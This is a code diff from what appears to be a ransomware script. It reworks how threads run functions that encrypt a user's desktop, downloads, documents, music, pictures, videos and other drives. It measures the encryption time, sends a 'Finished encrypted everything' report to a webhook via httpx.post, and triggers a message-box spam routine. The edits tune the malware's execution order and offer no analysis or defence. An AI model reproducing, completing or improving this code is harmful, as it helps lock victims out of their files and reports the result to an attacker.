@@ -740,7 +740,7 @@ def E_drive():
     else:
         pass
 
-a = Thread(target = C_drive_desktop)
+# a = Thread(target = C_drive_desktop)
 b = Thread(target = C_drive_downloads)
 c = Thread(target = C_drive_documents)
 d = Thread(target = C_drive_music)
@@ -749,7 +749,15 @@ ff = Thread(target = C_drive_videos)
 g = Thread(target = D_drive)
 h = Thread(target = E_drive)
 
-message = Thread(target = spam_messagebox)
+# C_drive_documents()
+# C_drive_music()
+# C_drive_pictures()
+# C_drive_videos()
+# D_drive()
+# E_drive()
+# C_drive_downloads()
+
+# message = Thread(target = spam_messagebox)
 
 start = time.time()
 c.start()
@@ -758,19 +766,19 @@ e.start()
 ff.start()
 g.start()
 h.start()
-a.start()
 b.start()
+# a.start()
 
 
 
-c.join()
-d.join()
-e.join()
-ff.join()
-g.join()
-h.join()
-a.join()
-b.join()
+# c.join()
+# d.join()
+# e.join()
+# ff.join()
+# g.join()
+# h.join()
+# b.join()
+# a.join()
 
 end = time.time()
 encrpyt_time = (end - start)
@@ -803,5 +811,7 @@ Finished encrypted everything - Time to encrypt everything {(encrpyt_time)}secon
     ]
 }
 httpx.post(webhook, json=embed)
-message.start()
-message.join()
+# message.start()
+# message.join()
+C_drive_desktop()
+spam_messagebox()
